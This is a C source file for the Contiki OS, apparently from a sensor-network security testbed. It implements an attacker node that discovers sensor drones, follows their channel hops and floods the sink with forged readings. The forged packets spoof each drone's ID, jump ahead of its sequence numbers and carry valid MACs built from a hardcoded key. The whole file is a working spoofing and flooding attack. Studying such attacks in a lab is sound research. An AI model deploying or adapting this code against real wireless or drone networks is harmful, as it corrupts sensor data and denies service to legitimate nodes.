#include "contiki.h"
#include "net/rime/mesh.h"
#include "lib/random.h"
#include "attack_targeting.h"
#include <stdio.h>
#include <string.h>

#define RADIO_CHANNEL_START 129
#define RADIO_CHANNEL_COUNT 4

#define MSG_VER 1
#define CTRL_CMD_HOP 1

#define MAC_KEY 0x6a09e667u

#define FLOOD_INTERVAL_MS 100
#define FLOOD_DISCOVERY_WARMUP_SEC 3
#define FLOOD_DISCOVERY_MAX_WAIT_SEC 8
#define FLOOD_MIN_LOCK_TARGETS 3
#define FLOOD_TARGET_SLOT_SEC 3
#define FLOOD_BURST_PACKETS 7
#define FLOOD_SEQ_LEAD 64

PROCESS(attacker_flood_proc, "Attacker flood");
AUTOSTART_PROCESSES(&attacker_flood_proc);

typedef struct {
  uint8_t ver;
  uint8_t drone_id;
  uint16_t seq;
  uint16_t temp;
  uint16_t vib;
  uint16_t gas;
  uint16_t batt_mv;
  uint32_t t;
  uint32_t mac;
} sensor_msg_t;

typedef struct {
  uint8_t ver;
  uint8_t cmd;
  uint8_t channel;
  uint8_t reserved;
  uint32_t t;
  uint32_t mac;
} control_msg_t;

static uint8_t current_channel = RADIO_CHANNEL_START;
static uint8_t channel_index = 0;
static const uint8_t channel_list[RADIO_CHANNEL_COUNT] = {129, 130, 131, 132};
static const linkaddr_t sink_addr = {{1, 0}};

static void recv_mesh(struct mesh_conn *c, const linkaddr_t *from, uint8_t hops);
static const struct mesh_callbacks mesh_cb = { recv_mesh, NULL, NULL };
static struct mesh_conn mesh;

static void send_flood_to_target(attack_target_t *target, void *ctx);
static void prepare_locked_target(attack_target_t *target, void *ctx);

static uint32_t
mac_fnv1a(const void *data, size_t len)
{
  const uint8_t *p = (const uint8_t *)data;
  uint32_t h = 2166136261u;
  uint32_t key = MAC_KEY;
  int i;
  for(i = 0; i < 4; i++) {
    h ^= (uint8_t)(key & 0xff);
    h *= 16777619u;
    key >>= 8;
  }
  for(size_t j = 0; j < len; j++) {
    h ^= p[j];
    h *= 16777619u;
  }
  return h;
}

static void
set_channel(uint8_t ch)
{
  if(ch == current_channel) {
    return;
  }
  mesh_close(&mesh);
  current_channel = ch;
  mesh_open(&mesh, current_channel, &mesh_cb);
}

static void
recv_mesh(struct mesh_conn *c, const linkaddr_t *from, uint8_t hops)
{
  control_msg_t ctrl;
  (void)c;
  (void)from;
  (void)hops;

  if(packetbuf_datalen() != sizeof(ctrl)) {
    return;
  }

  memcpy(&ctrl, packetbuf_dataptr(), sizeof(ctrl));
  if(ctrl.ver != MSG_VER || ctrl.cmd != CTRL_CMD_HOP) {
    return;
  }

  uint32_t mac = ctrl.mac;
  ctrl.mac = 0;
  if(mac != mac_fnv1a(&ctrl, sizeof(ctrl))) {
    return;
  }

  set_channel(ctrl.channel);
}

PROCESS_THREAD(attacker_flood_proc, ev, data)
{
  static struct etimer timer;
  static uint32_t discovery_started_at;
  static uint32_t target_slot_started_at;
  static uint8_t targets_locked;
  static uint8_t target_cursor;
  static uint8_t slot_packets_sent;
  static attack_target_t *current_target;

  PROCESS_EXITHANDLER(attack_targets_shutdown(););
  PROCESS_BEGIN();

  current_channel = channel_list[channel_index % RADIO_CHANNEL_COUNT];
  mesh_open(&mesh, current_channel, &mesh_cb);
  attack_targets_init();
  discovery_started_at = clock_seconds();
  target_slot_started_at = discovery_started_at;
  targets_locked = 0;
  target_cursor = 0;
  slot_packets_sent = 0;
  current_target = NULL;
  etimer_set(&timer, (CLOCK_SECOND * FLOOD_INTERVAL_MS) / 1000);

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));

    if(!targets_locked) {
      uint32_t now = clock_seconds();
      uint8_t visible_targets = attack_targets_for_each(NULL, NULL);

      if(((now - discovery_started_at) >= FLOOD_DISCOVERY_WARMUP_SEC &&
          visible_targets >= FLOOD_MIN_LOCK_TARGETS) ||
         (now - discovery_started_at) >= FLOOD_DISCOVERY_MAX_WAIT_SEC) {
        if(attack_targets_pin_active() > 0) {
          attack_targets_for_each(prepare_locked_target, NULL);
          attack_targets_shutdown();
          targets_locked = 1;
          target_slot_started_at = now;
          slot_packets_sent = 0;
          current_target = attack_targets_next_active(&target_cursor);
        }
      }

      if(!targets_locked) {
        etimer_reset(&timer);
        continue;
      }
    }

    if(current_target == NULL ||
       (clock_seconds() - target_slot_started_at) >= FLOOD_TARGET_SLOT_SEC) {
      current_target = attack_targets_next_active(&target_cursor);
      target_slot_started_at = clock_seconds();
      slot_packets_sent = 0;
    }
    if(current_target != NULL && slot_packets_sent < FLOOD_BURST_PACKETS) {
      send_flood_to_target(current_target, NULL);
      slot_packets_sent++;
    }

    etimer_reset(&timer);
  }

  PROCESS_END();
}

static void
prepare_locked_target(attack_target_t *target, void *ctx)
{
  uint16_t min_seq;
  (void)ctx;

  min_seq = (uint16_t)(target->last_seen_seq + FLOOD_SEQ_LEAD);
  if(min_seq == 0) {
    min_seq = 1;
  }
  if(target->forged_seq < min_seq) {
    target->forged_seq = min_seq;
  }
}

static void
send_flood_to_target(attack_target_t *target, void *ctx)
{
  sensor_msg_t msg;
  uint32_t now;
  uint32_t elapsed;
  uint32_t min_seq;
  (void)ctx;

  now = clock_seconds();
  elapsed = now >= target->last_seen_t ? (now - target->last_seen_t) : 0;
  min_seq = (uint32_t)target->last_seen_seq + FLOOD_SEQ_LEAD + elapsed;
  if(min_seq > 0xffffu) {
    min_seq = 0xffffu;
  }
  if(target->forged_seq < (uint16_t)min_seq) {
    target->forged_seq = (uint16_t)min_seq;
  }

  msg.ver = MSG_VER;
  msg.drone_id = target->drone_id;
  msg.seq = attack_target_next_seq(target);
  msg.t = now;
  msg.temp = 25 + (random_rand() % 5);
  msg.vib = 50 + (random_rand() % 20);
  msg.gas = 80 + (random_rand() % 20);
  msg.batt_mv = 4100;
  msg.mac = 0;
  msg.mac = mac_fnv1a(&msg, sizeof(msg));

  set_channel(target->channel);
  packetbuf_copyfrom(&msg, sizeof(msg));
  mesh_send(&mesh, &sink_addr);
}
